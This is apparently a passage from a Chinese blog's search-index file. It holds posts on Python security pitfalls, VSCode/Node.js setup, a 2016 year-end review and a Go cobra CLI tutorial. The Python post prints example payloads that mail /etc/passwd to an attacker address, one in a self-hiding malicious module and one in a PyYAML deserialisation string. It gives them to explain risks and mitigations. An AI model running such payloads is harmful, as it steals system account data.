[41]: (0.45 + 0.25) - (0.05 + 0.05)Out[41]: 0.In [49]: 0.6 + 0.3Out[49]: 0.8999999999999999In [50]: 0.65 + 0.35 - (0.05 + 0.05)Out[50]: 0.9 最好的处理措施是只要有可能，就坚持整数运算。次好的处理措施可能是使用decimal模块，它试图保护用户免受琐碎细节和危险缺陷之苦。 私有属性Python 不支持对象属性隐藏, 及时你使用__来保护你的变量(private),在内部，python也仅仅是将其别名了而已，而这个别名的动作是在解释器调用type来创建class时执行的的。123456789101112131415161718192021222324252627In [54]: class X(object): ...: def __init__(self): ...: self.__private = 1 ...: def get_private(self): ...: return self.__private ...: def has_private(self): ...: return hasattr(self, '__private') ...:In [55]: x = X()In [56]: x.has_private()Out[56]: FalseIn [57]: x.get_private()Out[57]: 1In [58]: x.__private = 2In [59]: x.__privateOut[59]: 2In [60]: hasattr(x, '__private')Out[60]: TrueIn [61]: x._X__privateOut[61]: 1 然后如果我们后面动态添加的属性，那么是不会有这种保护的(无转换发生)12345In [62]: x.__privateOut[62]: 2In [63]: hasattr(x, '__private')Out[63]: True 如果程序员依赖于双下划线属性来在他们的代码中做出重要决定，而不关注私有属性的不对称行为，那么这些小技巧会变成安全漏洞 模块执行语句实际上会导致导入的模块中的代码的执行，这一事实并不明显。这就是为什么甚至导入不可信模块或包是有风险的。导入像这样的简单模块可能会导致不愉快的结果：1234567891011$ cat malicious.pyimport osimport sysos.system('cat /etc/passwd | mail attacker@blackhat.com')del sys.modules['malicious'] # pretend it's not imported$ python&gt;&gt;&gt; import malicious&gt;&gt;&gt; dir(malicious)Traceback(most recent call last):NameError: name 'malicious' is not defined 猴子补丁运行时修改 Python 对象属性的过程称之为猴子补丁 ( monkey patching)。作为动态语言， Python 完全支持运行时程序自省和代码突变。一旦以某种方式导入了一个恶意模块，那么任何现有的可变对象可被不知不觉地在没有程序员同意的情况下被打猴子补丁。攻击者可以利用 Python 垃圾回收器 ( gc.get_objects())来掌握现有的所有对象，并黑进它们中任意一个。 Python 对象的类型是由 __class__ 属性决定的。邪恶的攻击者可以通过依靠改变活动对象的类型来令人绝望地把事情搞砸：12345678910111213141516171819&gt;&gt;&gt; class X(object): pass...&gt;&gt;&gt; class Y(object): pass...&gt;&gt;&gt; x_obj = X()&gt;&gt;&gt; x_obj&lt;__main__.X object at 0x7f62dbe5e010 &gt;&gt;&gt;&gt; isinstance(x_obj, X)True&gt;&gt;&gt; x_obj.__class__ = Y&gt;&gt;&gt; x_obj&lt;__main__.Y object at 0x7f62dbe5d350 &gt;&gt;&gt;&gt; isinstance(x_obj, X)False&gt;&gt;&gt; isinstance(x_obj, Y)True&gt;&gt;&gt; 对抗恶意猴子补丁的唯一处理措施是保证导入的 Python 模块的真实性和完整性, 一个简单的方法是使用__slot__来保护自己的类不被注入攻击,但是这又丧失了一些灵活性。 通过subprocess进行shell注入以胶水语言著称，对Python脚本来说，通过让操作系统来执行它们，可能还提供额外的参数，来委派系统管理任务给其他程序，是非常常见的。subprocess模块为这样的任务提供了易于使用和相当高层次的服务。12345&gt;&gt;&gt; from subprocess import call&gt;&gt;&gt; call('date')2017年 1月10日 星期二 13时11分53秒 CST0&gt;&gt;&gt; 但有一个陷阱！要利用UNIX shell服务，例如命令行参数扩展，call函数的shell关键字参数应该设置为True。然后原样传递call函数的第一个参数给系统shell，用以进一步的解析。一旦无效的用户输入到达call函数(或者其他在 subprocess 模块中实现的函数)，那么就会开放一个口给底层系统资源。12345&gt;&gt;&gt; call('cut -d: -f1 /etc/passwd', shell=True)nobodyrootdaemon... 显然，将shell关键字保持默认值False，并且提供命令及其参数的数组给subprocess函数，不要为外部命令执行调用UNIX shell，这样会安全得多。在这第二次调用格式，命令或者它的参数都不会被shell解析或展开。如果应用的本质决定了使用UNIX shell服务，那么清理一切到 subprocess的参数，确保没有不想要的shell功能可以被恶意用户利用，这完全是重要的。在更新的Python版本中，可以用标准库的shlex.quote函数来进行shell转义。 序列化-pyYAML作为一个流行的配置文件格式，YAML不一定被认为是一个能够诱使反序列化器执行任意代码的强大的序列化协议。让它甚至更危险的是，事实上Python的YAML默认实现—-PyYAML让反序列化看起来非常无辜：1234567&gt;&gt;&gt; dangerous_input = """... some_option: !!python/object/apply:subprocess.call... args: [cat /etc/passwd | mail 719118794@qq.com]... kwds: &#123;shell: true&#125;... """&gt;&gt;&gt; yaml.load(dangerous_input)&#123;'some_option': 0&#125; 而/etc/passwd已经被窃取了。一个建议的解决方法是总是使用 yaml.safe_load来处理那些你不信任的YAML序列化。尽管如此，目前的PyYAML默认感觉有些驱使人考虑其他倾向于为相似的目的使用 dump/ load函数名（但是以一种安全的方式的序列化库]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用VSCode快速搭建NodeJS开发环境]]></title>
      <url>%2F2017%2F01%2F01%2Fnodejs-vscode%2F</url>
      <content type="text"><![CDATA[文本的目的是快速搭建NodeJS的开发环境，NodeJS的常见的开发方式有2种，一种是编辑器，一种是IDE。编辑器推荐使用微软出品的vscdoe，因为其启动速度快，轻量级，执行简单，调试方便，还有界面漂亮。而IDE 无可厚非的就是WebStorm了。这里使用vscdoe搭建开发环境，因为IDE真的比较耗内存。除非开发大型项目,否则轻易我不开IDE。 VSCode简介VSCode全称是Visual Studio Code, 由微软出品,但它不是那个大块头的Visual Studio ,它是一个精简版的迷你Visual Studio，并且，Visual Studio Code可以跨！平！台！Windows、Mac和Linux通用。 安装VSCode可以通过官方下载, 由于你我都懂的原因，可能无法访问，因此你可能会需要使用国内镜像,直接下mac版本的安装包，安装。 运行在VS Code中，我们可以非常方便地运行JavaScript文件。 VS Code以文件夹作为工程目录（Workspace Dir），所有的JavaScript文件都存放在该目录下。此外，VS Code在工程目录下还需要一个.vscode的配置目录，里面存放里VS Code需要的配置文件。 假设我们要创建一个hello的工程，因此我需要一个hello的目录作为工程目录，然后在里面编写hello.js文件，则该工程目录的结构如下：1234567hello/ &lt;-- workspace dir|+- hello.js &lt;-- JavaScript file|+- .vscode/ &lt;-- VS Code config | +- launch.json &lt;-- VS Code config file for JavaScript 然后切换到debug模式进行运行，关于debug模式后面介绍。对于更细节相关的文档可以参考微软官方提供的JavaScript in VS Code 智能提示因为之前微软推出了typescript语言，结合tsd文件，用visual studio写typescript代码是相当爽的，智能提示的功能非常nb。 这个功能理所应当也被vscode继承了，但是现在tsd项目已经过期了，接过这个接力棒的是typings 因此我们将通过Typings来实现JavaScript智能提示功 注意事项 安装NPM NPM是和Node.js一起安装的，如果你想使用NPM的话，那么你应该先安装Node.js Typings vs TSD Typings作为TSD的替代者而出现的，如果你已经安装了TSD，那么需要知道现在TSD已经不推荐使用了。如果已经安装TSD请执行下面的命令来移除它1npm rm -g tsd CNPM 在国内由于墙的原因，大部分时候使用NPM安装模块的速度上会很慢，这时候我们其实可以选择国内淘宝的NPM镜像，关于淘宝NPM镜像的使用方法可以参考淘宝 NPM 镜像 使用下面的命令来进行安装和使用12npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm install koa 安装Typings我们通过cnpm来安装typings1234maojun@maojun-mbp$ npm install -g typingsmaojun@maojun-mbp$ typings -v2.0.0 配置智能提示安装完成后，我们需要安装相应的需要提示功能库或者框架的类型信息文件，在这里我们新建一个文件夹 NodeSnippet，为了了解Typings的使用方法，你可能需要简单看看typings github 使用命令行进入到该目录中，分别输入下面两个命令来安装Node和Lodash的类型接口信息文件：12typings install dt~node --global --savetypings install lodash --save 这时候我们可以看到我们的 NodeSnippet目录中多了一些文件：12345678910111213 maojun@maojun-mbp$ tree ..├── typings│ ├── globals│ │ └── node│ │ ├── index.d.ts│ │ └── typings.json│ ├── index.d.ts│ └── modules│ └── lodash│ ├── index.d.ts│ └── typings.json└── typings.json 这些文件就是为我们提供提示信息的类型类型文件(使用TypeScript定义)。查看Typings是否支持某个库或框架的智能提示，我们可以使用下面的命令:1typings search exampleName 启动智能提示配置好了类型接口后，可以通过两种方式来启动提示功能： 文件头加注释 1/// &lt;reference path="./typings/index.d.ts" /&gt; 在目录(在这里是NodeSnippet文件夹中)增加一个名为jsconfig.json的空文件 更多jsconfig.json文件的内容可以参考： JavaScript in VS Code 这样我们写代码的时候就有智能提示功能了， 效果如下: 调试如何调试写好了的JS程序喃？ 用VS Code快速创建launch.json文件, 主要是修改program这个参数，指明你 可执行文件位置。 关于Debug的细节，请参考Debugging 123456789101112131415161718192021&#123; // Use IntelliSense to learn about possible Node.js debug attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 "version": "0.2.0", "configurations": [ &#123; "type": "node", "request": "launch", "name": "启动程序", "program": "$&#123;workspaceRoot&#125;/app.js", "cwd": "$&#123;workspaceRoot&#125;" &#125;, &#123; "type": "node", "request": "attach", "name": "附加到进程", "port": 5858 &#125; ]&#125; 效果如下:]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[2016总结与2017计划]]></title>
      <url>%2F2016%2F12%2F31%2F2016-summary%2F</url>
      <content type="text"><![CDATA[孔子曰:”吾日三省吾身”, 平时很少会静下心来反省和总结一段时间的功与过, 2016马上就要过去了，在这一年将要结束之时, 还是想回过一下这一年来的得与失, 顺便安排下来年的计划。 记录下这一年来自己的变化, 同时也为来年再战作准备, 而且我这人记性不好, 留个底,照亮自己需要走的路。 转瞬即逝的20162016是繁忙的一年，工作上处处充满挑战，有些挑战是自己喜欢的，有些挑战也是自己比较抵触的，我喜欢开发，从运维开发转而参与大型系统开发，这的确是一个不小的挑战，我是一个对技术有点激情的人，因此这个挑战对我而言还是比较喜欢的。后来同时做起了产品设计, 每天扣脑袋, 看别人的产品，画产品设计图， 这些在当时的我是很抵触的, 当时我还处于单纯的想积累技术的阶段。现在看来这段经历也是我宝贵的财富, 毕竟产品决定东西的价值，用再牛叉的技术,做一个没有价值的东西, 这是一件愚蠢的行为，我这里说的价值是长远价值，而不是当下看起来有价值, 这个说起来很悬，以后有机会深入讨论这个。 2016这一年也在和JumpServer一同成长的一年，感触也蛮多的，首先是技术的成长，一个开源产品的技术的迭代，我们致力于设计NB的产品和写出漂亮的代码。其次为有可能的融资谈判而兴奋过，然而最后还是平静下来, 慢慢做一个自己认可的能力范围之内的产品。 工作上的事儿, 总是有那么点紧绷, 其实生活上也有很多值得高兴的事儿，我们有了自己的房子，并且搬进去了，告别了租房的日子，这一切多谢我的老婆打理，我基本是啥心都没操过。其次，我女儿和我关系也很不错，虽然她生气的时候只找她妈妈，但是我在她心中的地位也仅次于她妈妈，我也心有愧疚，作为一个父亲我陪伴她的时候是有点少了。还有我的好搭档，在我最需要钱的时候, 一身不吭的直接转我支付宝上,人生中能交到一个这样的朋友，是我的莫大的荣幸。 还有一个事儿，我终于用上Mac了，虽然是一个二手的MBP，但是这对满足一个屌丝的虚荣心完全受用了, 说岔了, 我再也不用在Windows上装Ubuntu开发了。 瞬息万变的2017变化和革新是很快的, 比如OpenStack没有那么热了, 容器技术也基本成了开发的必备技能, 无论你作为一个前端开发还是后端开发JavaScript都快成为一门必备语言了。前后端的完全分离也愈演愈烈, 各种前段框架的变化。伴随而来的是微服务+容器技术的紧密结合。在最后DDD也随着微服务的出现，对开发人员提出了更高的需求, 以后那种只会写代码的人将愈来愈少了。 我Hold不住这些，因此在技术方面我仅能列出我需要提升的书单: Python提升书单(今年主力) 基础回过 廖雪峰官网 Think Python 2ed 中译版精校 PDF 电子书 进阶深 python3-cookbook 电子书Python高手之路 常见的一些代码实现 python实例手册 网站上的文章 设计模式 快速版大话设计模式 一些最新的例子 精通Python设计模式 数据结构与算法 快速阅读总结 电子书：Data Structures and Algorithms with Python-2015 源码阅读 Django Class Based View Flask 源码阅读 Openstack KeyStone 源码阅读 理解Python解释器 用Python实现一个Python解释器 Golang提升书单 回过基础： Go Web 编程 Go入门指南 JavaScript提升书单 回过基础： 廖雪峰官网 阮一峰的javascript教程 ECMAScript 6 入门 除了技术, 还应该有生活。而生活就是: 赶紧把账还完]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[如何使用golang编写漂亮的命令行工具]]></title>
      <url>%2F2016%2F12%2F30%2Fgo-cobra%2F</url>
      <content type="text"><![CDATA[无论是Openstack还是Docker都有一个漂亮的命令行工具，Openstack的命令行工具主要使用的是Python的argparse库，至于Docker的CLI的实现还没看，但是今天看到了一个在Golang中 用于构建像Docker命令行风格的一个库:cobra cobra简介Cobra既是一个用来创建强大的现代CLI命令行的golang库，也是一个生成程序应用和命令行文件的程序。它提供的功能有： 简易的子命令行模式，如 app server， app fetch等等 完全兼容posix命令行模式 嵌套子命令subcommand 支持全局，局部，串联flags 使用Cobra很容易的生成应用程序和命令，使用cobra create appname和cobra add cmdname 如果命令输入错误，将提供智能建议，如 app srver，将提示srver没有，是否是app server 自动生成commands和flags的帮助信息 自动生成详细的help信息，如app help 自动识别-h，–help帮助flag 自动生成应用程序在bash下命令自动完成功能 自动生成应用程序的man手册 命令行别名 自定义help和usage信息 可选的紧密集成的viper apps 从功能上看完全超越了argparse， 下面将做一个简单的测试，体验下cobra的强大 安装安装cobra需要翻墙，我的环境是Mac，使用ss + polipo来提供https的方向代理。我的代理端口在8123,所以命令行是这样的1$https_proxy=localhost:8123 go get -v github.com/spf13/cobra/cobra 安装完成后可以看到cobra的一些帮助信息1234567891011121314151617181920maojun@maojun-mbp$ cobra -hCobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: cobra [command]Available Commands: add Add a command to a Cobra Application init Initialize a Cobra ApplicationFlags: -a, --author string Author name for copyright attribution (default "YOUR NAME") --config string config file (default is $HOME/.cobra.yaml) -l, --license license Name of license for the project (can provide license in config) -b, --projectbase string base project directory, e.g. github.com/spf13/ --viper Use Viper for configuration (default true)Use "cobra [command] --help" for more information about a command. 使用接下来将使用cobra构建一个不带子命令的CLI和带子命令的CLI 初始化我们可以通过cobra提供的init命令来生成CLI的框架代码，因此切换到GOPATH/src下面,初始CLI框架12345maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]` 这个命令会帮你生成这样一个框架代码123456 maojun@maojun-mbp$ tree demodemo├── LICENSE├── cmd│ └── root.go└── main.go 简单的CLI在写一些简单的CLI的时候我们其实是不需要有子命令的，我们往往需要这样一种简单的CLI12345678910demo.exeDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -h, --help help for demo -n, --name string person's name 接下来我们就在上面生成的代码的基础上完成一个不带子命令的CLI。首先，我需要编写我的业务逻辑，因此我在demo下面新建一个包，名称为simple。如下：123456789maojun@maojun-mbp$ tree ..├── LICENSE├── cmd│ └── root.go├── main.go└── simple ├── simple.go └── simple_test.go 这里仅仅实现一个print作为样例,因此simple.go是这样实现的123456789package simpleimport ( "fmt")func Show(name string, age int) &#123; fmt.Printf("My name is %s, my age is %d\n", name, age)&#125; 接下来我们需要将我们实行的整个Show方法暴露给CLI, 我们从生成的main文件入手分析。 在main里面调用了 demo/cmd包里面暴露的Execute 函数 [cmd.Execute()] 在demo/cmd/root.go中发现Execute执行的是RootCmd.Execute() 而RootCmd是一个cobra的Command结构体[RootCmd = &amp;cobra.Command]显然我们想要实行不带子命令的CLI，只需要将RootCmd的修改成我们需要的结构体就ok了 这里做了几点修改 RootCmd中的Command结构体中的Run方法需要我们定义， 主要功能就是调用simple里面的Show接口 cmd包初始化得时候需要通过RootCmd.Flags()获取命令行传入的name和age的参数，因此这里需要修改init方法 最后我们不需要从配置文件读取配置，注释掉：nitConfig函数和”github.com/spf13/viper” 最终这个root.go是这样的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "os" "demo/simple" "github.com/spf13/cobra" // "github.com/spf13/viper")//var cfgFile stringvar name stringvar age int// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "demo", Short: "A test demo", Long: `Demo is a test appcation for print things`,// Uncomment the following line if your bare application// has an action associated with it: Run: func(cmd *cobra.Command, args []string) &#123; if len(name) == 0 &#123; cmd.Help() return &#125; simple.Show(name, age) &#125;,&#125;// Execute adds all child commands to the root command sets flags appropriately.// This is called by main.main(). It only needs to happen once to the rootCmd.func Execute() &#123; if err := RootCmd.Execute(); err != nil &#123; fmt.Println(err) os.Exit(-1) &#125;&#125;func init() &#123; // cobra.OnInitialize(initConfig) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags, which, if defined here, // will be global for your application. // RootCmd.PersistentFlags().StringVar(&amp;cfgFile, "config", "", "config file (default is $HOME/.demo.yaml)") // Cobra also supports local flags, which will only run // when this action is called directly. // RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle") RootCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") RootCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125;// // initConfig reads in config file and ENV variables if set.// func initConfig() &#123;// if cfgFile != "" &#123; // enable ability to specify config file via flag// viper.SetConfigFile(cfgFile)// &#125;// viper.SetConfigName(".demo") // name of config file (without extension)// viper.AddConfigPath("$HOME") // adding home directory as first search path// viper.AutomaticEnv() // read in environment variables that match// // If a config file is found, read it in.// if err := viper.ReadInConfig(); err == nil &#123;// fmt.Println("Using config file:", viper.ConfigFileUsed())// &#125;// &#125; 最后测试下是不是我们想要的效果1234567891011maojun@maojun-mbp$ go run main.go -hDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -n, --name string persion's namemaojun@maojun-mbp$ go run main.go -n "test" -a 10My name is test, my age is 10 带子命令的CLI对于复杂的情况，往往需要带子命令场景，比如Docker的CLI，而最终的效果应该是这样的12345678910111213141516demoDemo is a test appcation for print thingsUsage: demo [flags] demo [command]Available Commands: test A brief description of your commandFlags: -a, --age int person's age -h, --help help for demo -n, --name string person's nameUse "demo [command] --help" for more information about a command. 支持子命令是cobra的自己的功能，因此直接可以通过cobra生成带子命令的代码12345678maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]`maojun@maojun-mbp$ cobra add testtest created at /Users/maojun/GoWorkDir/src/cmd/test.go 注释掉root.go那些不需要的地方, 然后修改生成的test.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "github.com/spf13/cobra")var name stringvar age int// testCmd represents the test commandvar testCmd = &amp;cobra.Command&#123; Use: "test", Short: "A brief description of your command", Long: `A longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, Run: func(cmd *cobra.Command, args []string) &#123; // TODO: Work your own magic here fmt.Printf("My name is %s, my age is %d\n", name, age) &#125;,&#125;func init() &#123; RootCmd.AddCommand(testCmd) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags which will work for this command // and all subcommands, e.g.: // testCmd.PersistentFlags().String("foo", "", "A help for foo") // Cobra supports local flags which will only run when this command // is called directly, e.g.: testCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") testCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125; 最后测试下是不是我们想要的效果 12345678910111213141516171819202122232425262728293031323334353637383940maojun@maojun-mbp$ go run main.go -hA longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo [command]Available Commands: test A brief description of your commandFlags: --config string config file (default is $HOME/.demo.yaml) -t, --toggle Help message for toggleUse "demo [command] --help" for more information about a command.maojun@maojun-mbp$ go run main.go test -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo test [flags]Flags: -a, --age int person's age -n, --name string persion's nameGlobal Flags: --config string config file (default is $HOME/.demo.yaml) maojun@maojun-mbp$ go run main.go test -a 10 -n testMy name is test, my age is 10 命令行补全，man这些可以自己手动测试]]></content>
    </entry>

    
  
  
</search>
